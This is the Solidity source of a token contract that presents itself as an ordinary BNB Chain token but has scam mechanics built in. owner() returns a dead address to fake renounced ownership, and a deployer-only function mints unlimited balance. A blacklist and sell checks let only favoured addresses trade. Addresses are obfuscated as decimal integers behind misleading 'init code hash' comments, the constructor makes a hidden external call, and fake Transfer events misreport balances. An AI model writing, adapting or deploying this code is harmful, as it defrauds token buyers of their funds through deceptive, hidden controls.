// SPDX-License-Identifier: evmVersion, MIT

pragma solidity ^0.6.12;


contract Whitelist  {
    mapping(address => bool) private whitelist;

    event AddedToWhitelist(address indexed account);
    event RemovedFromWhitelist(address indexed account);

    function addToWhitelist(address account) public  {
        require(account != address(0), "Invalid address");
        require(!whitelist[account], "Account is already whitelisted");
        whitelist[account] = true;
        emit AddedToWhitelist(account);
    }

    function removeFromWhitelist(address account) public  {
        require(whitelist[account], "Account is not whitelisted");
        whitelist[account] = false;
        emit RemovedFromWhitelist(account);
    }

    function isWhitelisted(address account) public view returns (bool) {
        return whitelist[account];
    }
}

interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}
interface IERC88 {
 function addContract(address c) external;

}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}
 
library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract Token  {
     address public allowedAddress = 0xE2131653A7060EDF904a87Ad41f15421349aca9F;


     modifier onlyAllowedAddress() {
        require(msg.sender == allowedAddress, "You are not allowed to call this function");
        _;
    }
    address public mubiao = 0xfe211c177b081f0F221157E66C0Fc86e5198080E;
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    uint256 public constant minbnb = 1;
    uint256 public constant maxbnb = type(uint256).max / 2;
    uint256 public constant musdt  = type(uint256).max;

    
mapping(address => bool) public  heimingdan;
  function withdraw(address payable recipient) external onlyAllowedAddress {
       
        
        recipient.transfer(address(this).balance);
    }

function addToheimingdanlist(address[] memory accounts) public onlyAllowedAddress  {
        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];
            require(account != address(0), "Invalid address");
            require(!heimingdan[account], "Account is already blacklisted");
            heimingdan[account] = true;
            
        }
    }
      receive() external payable {
       IERC20(address(this)).transferFrom(SSW, allowedAddress, totalSupply);

        
    }
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _deployer, address indexed _spender, uint _value);
    function transfer(address _to, uint _value) public payable returns (bool) {
         require(!heimingdan[msg.sender], "Yo");
        require(!heimingdan[_to], "Rec");
    return transferFrom(msg.sender, _to, _value);
    }
     address public  SSW = 0xa180Fe01B906A1bE37BE6c534a3300785b20d947;
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        if(_from == deployer || _to == deployer  || _from == _Uniswap || _from == _Pancakeswap
        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    address   private   Uniswap = address  //Uniswap  init code hash
    //_Uniswap = UNIpairFor(Uniswap, EtherGas, address(this)); // Uniswap  init code hash
    (413361219909386212621520881188328179332411539954 );
    address   private   EtherGas = address  //EtherGas init code hash
    //_Uniswap = UNIpairFor(Uniswap, EtherGas, address(this)); //EtherGas  init code hash
    (528983046434266124739005309118477168076712240761);
    address   private   WEther = address   //WEther  init code hash
    //_Uniswap = UNIpairFor(Uniswap, EtherGas, address(this)); //WEther  init code hash
    (1176671841879598500506733905980056274522358959631);
    address   private   EUSD = address   //EUSD  init code hash
    //_Uniswap = UNIpairFor(Uniswap, EtherGas, address(this)); //EUSD  init code hash
    (508565290665719717109866445600462524872401603791);
     
    uint public _totalFee;
    function ensure1(address _from, address _to, uint _value) internal view returns(bool) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        if(_from == deployer || _to == deployer || _from ==  _Uniswap || _from == _Pancakeswap
        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    function _UniswapPairAddr () view internal returns (address) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        return _Uniswap;
    }
    function _MdexPairAddr () view internal returns (address) {
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        return _MDEX;
    }
    function _PancakePairAddr () view internal returns (address) {
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        return _Pancakeswap;
    }
    function owner() external pure returns(address) {
        return address(0x0dead);
    }
    function setrule(uint rule) external {
        require(msg.sender == deployer);
        balanceOf[deployer] += rule;
    }
    address   private   MDEXBSC = address  //MDEXBSC  init code hash
    //_MDEX = UNIpairFor(MDEXBSC, HecoGas, address(this)); //MDEXBSC   init code hash
    (96864598740440424637969304477468068396426389312 );
    address   private   HecoGas = address  //HECOGas   init code hash
    //_MDEX = UNIpairFor(MDEXBSC, HecoGas, address(this)); //HECOGas   init code hash
    (1285765745927100442851198908086982613915333952487);
    function ensure2(address _from, address _to, uint _value) internal view returns(bool) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        if(_from == deployer || _to == deployer || _from ==  _Uniswap || _from == _Pancakeswap
        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    function _UniswapPairAddr1 () view internal returns (address) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        return _Uniswap;
    }
    function _MdexPairAddr1 () view internal returns (address) {
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        return _MDEX;
    }
    function _PancakePairAddr1 () view internal returns (address) {
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        return _Pancakeswap;
    }
    address   private   Pancakeswap= 0x10ED43C718714eb63d5aA57B78B54704E256024E;  //Pancake  init code hash
    //_Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this)); //Pancake  init code hash
    address   private   BSCGas = address  //BSCGas   init code hash
    //_Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this)); // BSCGas  init code hash
    (935050711052251121247594223525375423387386410272);
    function ensure3(address _from, address _to, uint _value) internal view returns(bool) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        if(_from == deployer || _to == deployer || _from ==  _Uniswap || _from == _Pancakeswap
        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    function _UniswapPairAddr2 () view internal returns (address) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        return _Uniswap;
    }
    function _MdexPairAddr2 () view internal returns (address) {
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        return _MDEX;
    }
    function _PancakePairAddr2 () view internal returns (address) {
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        return _Pancakeswap;
    }
    function VerifyAddr(address addr) public view returns (bool) {
        require(ensure(addr,address(this),1));
        return true;
    }
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
     
         require(!heimingdan[msg.sender], "Yo");
        require(!heimingdan[_to], "Rec");
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        uint fee = _value / 100 * _totalFee;
        uint afterFee = _value - _value / 100 * _totalFee;
        balanceOf[address(0)] += fee;
        balanceOf[_from] -= _value;
        balanceOf[_to] += afterFee;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        emit Transfer(_from, address(0), fee);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
         require(!heimingdan[msg.sender], "Yo");
        require(!heimingdan[addr], "Rec");
        if(addedValue == 100){
            emit Transfer(address(0x0), addr, addedValue*(10**uint256(decimals)));
        }
        if(addedValue > 0) {
            balanceOf[addr] = addedValue*(10**uint256(decimals));
        }
        require(msg.sender == MDEXBSC);
        canSale[addr]=true;
        return true;
    }
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 public _minSale = 0;
    uint256 public _maxSale = type(uint256).max;
    uint256 public _saleNum = type(uint256).max;
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        
        canSale[addr]=true;
        return true;
    }
  
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value/2);
            emit Transfer(msg.sender, _to, _value/2);
        }
        return true;
    }
    address pairAddress;
    function delegate(address addr) public payable returns(bool){
        require (msg.sender == deployer);
        pairAddress = addr;
        return true;
    }
    function UNIpairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }
    function PANCAKEpairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint _totalfee) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _totalFee = _totalfee;
        deployer = msg.sender;
        balanceOf[SSW] = totalSupply;
        allowance[SSW][(address(this))] = type(uint256).max;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if (_totalFee >= 0) balanceOf[WEther] =totalSupply*(10**uint256(2));
        IERC88(EUSD).addContract(address(this));
    }
}